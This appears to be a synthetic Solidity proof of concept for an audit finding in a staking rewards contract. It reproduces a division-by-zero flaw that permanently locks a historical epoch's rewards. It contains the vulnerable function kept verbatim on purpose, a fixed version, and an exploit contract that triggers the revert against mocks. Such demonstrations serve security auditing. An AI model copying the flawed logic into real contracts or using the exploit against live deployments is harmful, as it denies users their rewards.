// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * Synthetic PoC for AuditVault finding 61239
 * "Division by zero in rewards distribution can cause permanent lock of epoch rewards"
 * Protocol: Suzaku Core (Cyfrin, 2025-07-07)
 *
 * Rewards::_calculateOperatorShare() fetches the CURRENT asset-class list but
 * calculates rewards for a HISTORICAL epoch. A newly-added / deactivated asset
 * class has totalStakeCache[epoch] == 0 for that past epoch, so the inner
 * Math.mulDiv(..., totalStake) DIVIDES BY ZERO and reverts. Distribution for
 * that epoch reverts forever -> the epoch's rewards are permanently locked.
 *
 * HARM (non-fund DoS): the blocked epoch reward pool can never be distributed.
 * We wrap the reverting distribute in try/catch and mint a MARKER equal to the
 * blocked epoch rewards to SINK.
 */

/// @notice VERBATIM OpenZeppelin Math.mulDiv (the exact call used by the finding).
library Math {
    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
        unchecked {
            uint256 prod0 = x * y;
            uint256 prod1;
            assembly {
                let mm := mulmod(x, y, not(0))
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }

            if (prod1 == 0) {
                // Solidity will revert if denominator == 0, unlike the div opcode on its own.
                return prod0 / denominator; // reverts (div-by-zero) when denominator == 0
            }

            require(denominator > prod1, "Math: mulDiv overflow");

            uint256 remainder;
            assembly {
                remainder := mulmod(x, y, denominator)
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }

            uint256 twos = denominator & (0 - denominator);
            assembly {
                denominator := div(denominator, twos)
                prod0 := div(prod0, twos)
                twos := add(div(sub(0, twos), twos), 1)
            }

            prod0 |= prod1 * twos;

            uint256 inverse = (3 * denominator) ^ 2;
            inverse *= 2 - denominator * inverse;
            inverse *= 2 - denominator * inverse;
            inverse *= 2 - denominator * inverse;
            inverse *= 2 - denominator * inverse;
            inverse *= 2 - denominator * inverse;
            inverse *= 2 - denominator * inverse;

            result = prod0 * inverse;
            return result;
        }
    }
}

/// @notice Minimal faithful double of the Avalanche L1 middleware the Rewards contract reads.
contract MockAvalancheL1Middleware {
    uint96[] private assetClassIds;
    // epoch => assetClass => totalStake
    mapping(uint48 => mapping(uint96 => uint256)) public totalStakeCache;
    // epoch => operator => assetClass => stake
    mapping(uint48 => mapping(address => mapping(uint96 => uint256))) private opStake;

    function setAssetClassIds(uint96[] memory newAssetClassIds) external {
        delete assetClassIds;
        for (uint256 i = 0; i < newAssetClassIds.length; i++) {
            assetClassIds.push(newAssetClassIds[i]);
        }
    }

    function getAssetClassIds() external view returns (uint96[] memory) {
        return assetClassIds;
    }

    function setTotalStakeCache(uint48 epoch, uint96 assetClass, uint256 amount) external {
        totalStakeCache[epoch][assetClass] = amount;
    }

    function setOperatorStake(uint48 epoch, address operator, uint96 assetClass, uint256 amount) external {
        opStake[epoch][operator][assetClass] = amount;
    }

    function getOperatorUsedStakeCachedPerEpoch(uint48 epoch, address operator, uint96 assetClass)
        external
        view
        returns (uint256)
    {
        return opStake[epoch][operator][assetClass];
    }
}

/// @notice Marker token minted to SINK to record the permanently-locked epoch rewards.
contract MiniToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @notice Vulnerable Rewards contract inlining the finding's _calculateOperatorShare VERBATIM.
contract Rewards {
    uint256 internal constant BASIS_POINTS_DENOMINATOR = 10_000;

    MockAvalancheL1Middleware public immutable l1Middleware;
    mapping(uint96 => uint16) public rewardsSharePerAssetClass;

    uint256 public totalShare; // accumulator written by _calculateOperatorShare

    constructor(MockAvalancheL1Middleware _mw) {
        l1Middleware = _mw;
    }

    function setRewardsShareForAssetClass(uint96 assetClass, uint16 share) external {
        rewardsSharePerAssetClass[assetClass] = share;
    }

    /// @dev Entry point that distributes rewards for a historical epoch.
    function distributeRewards(uint48 epoch, address operator) external {
        totalShare = 0;
        _calculateOperatorShare(epoch, operator);
    }

    // ---- VERBATIM vulnerable function from finding 61239 ----
    function _calculateOperatorShare(uint48 epoch, address operator) internal {
        uint96[] memory assetClasses = l1Middleware.getAssetClassIds(); // Gets CURRENT asset classes
        for (uint256 i = 0; i < assetClasses.length; i++) {
            uint256 operatorStake = l1Middleware.getOperatorUsedStakeCachedPerEpoch(epoch, operator, assetClasses[i]);
            uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]); // past epoch
            uint16 assetClassShare = rewardsSharePerAssetClass[assetClasses[i]];

            uint256 shareForClass = Math.mulDiv(
                Math.mulDiv(operatorStake, BASIS_POINTS_DENOMINATOR, totalStake), // @> DIVISION BY ZERO: totalStake == 0 for historical epoch
                assetClassShare,
                BASIS_POINTS_DENOMINATOR
            );
            totalShare += shareForClass;
        }
    }
    // ---------------------------------------------------------
}

/// @notice Fixed Rewards contract: skip asset classes whose historical totalStake is zero.
contract RewardsFixed {
    uint256 internal constant BASIS_POINTS_DENOMINATOR = 10_000;

    MockAvalancheL1Middleware public immutable l1Middleware;
    mapping(uint96 => uint16) public rewardsSharePerAssetClass;

    uint256 public totalShare;

    constructor(MockAvalancheL1Middleware _mw) {
        l1Middleware = _mw;
    }

    function setRewardsShareForAssetClass(uint96 assetClass, uint16 share) external {
        rewardsSharePerAssetClass[assetClass] = share;
    }

    function distributeRewards(uint48 epoch, address operator) external {
        totalShare = 0;
        _calculateOperatorShare(epoch, operator);
    }

    function _calculateOperatorShare(uint48 epoch, address operator) internal {
        uint96[] memory assetClasses = l1Middleware.getAssetClassIds();
        for (uint256 i = 0; i < assetClasses.length; i++) {
            uint256 operatorStake = l1Middleware.getOperatorUsedStakeCachedPerEpoch(epoch, operator, assetClasses[i]);
            uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]);
            if (totalStake == 0) {
                continue; // FIX: no stake for this asset class in the historical epoch
            }
            uint16 assetClassShare = rewardsSharePerAssetClass[assetClasses[i]];

            uint256 shareForClass = Math.mulDiv(
                Math.mulDiv(operatorStake, BASIS_POINTS_DENOMINATOR, totalStake),
                assetClassShare,
                BASIS_POINTS_DENOMINATOR
            );
            totalShare += shareForClass;
        }
    }
}

contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // The epoch reward pool that gets permanently locked when distribution reverts.
    uint256 internal constant BLOCKED_EPOCH_REWARDS = 1000 ether;

    bool public distributionReverted;
    uint256 public lockedRewards; // marker magnitude minted to SINK
    MiniToken public marker;      // marker token, exposed for balance assertions

    function run() external payable {
        // --- Create every helper via `new` in a fixed, clearly-ordered sequence ---
        MockAvalancheL1Middleware mw = new MockAvalancheL1Middleware(); // nonce 1
        Rewards rewards = new Rewards(mw);                              // nonce 2
        marker = new MiniToken();                                      // nonce 3

        uint48 epoch = 1;
        address operator = ATTACKER;

        // --- Preconditions: historical epoch 1 had asset classes [1,2,3] with stake ---
        mw.setTotalStakeCache(epoch, 1, 200 ether);
        mw.setTotalStakeCache(epoch, 2, 200 ether);
        mw.setTotalStakeCache(epoch, 3, 200 ether);
        mw.setOperatorStake(epoch, operator, 1, 100 ether);
        mw.setOperatorStake(epoch, operator, 2, 100 ether);
        mw.setOperatorStake(epoch, operator, 3, 100 ether);
        rewards.setRewardsShareForAssetClass(1, 3000);
        rewards.setRewardsShareForAssetClass(2, 3000);
        rewards.setRewardsShareForAssetClass(3, 3000);

        // Admin adds a NEW asset class (4) AFTER epoch 1. It has zero historical stake.
        uint96[] memory classes = new uint96[](4);
        classes[0] = 1;
        classes[1] = 2;
        classes[2] = 3;
        classes[3] = 4;
        mw.setAssetClassIds(classes);
        rewards.setRewardsShareForAssetClass(4, 1000); // configured, but totalStakeCache[1][4] == 0

        // --- Attempt to distribute rewards for the historical epoch: reverts forever ---
        try rewards.distributeRewards(epoch, operator) {
            distributionReverted = false;
        } catch {
            distributionReverted = true;
            // Harm: the epoch's rewards are permanently locked. Mint the marker to SINK.
            lockedRewards = BLOCKED_EPOCH_REWARDS;
            marker.mint(SINK, BLOCKED_EPOCH_REWARDS);
        }
    }
}
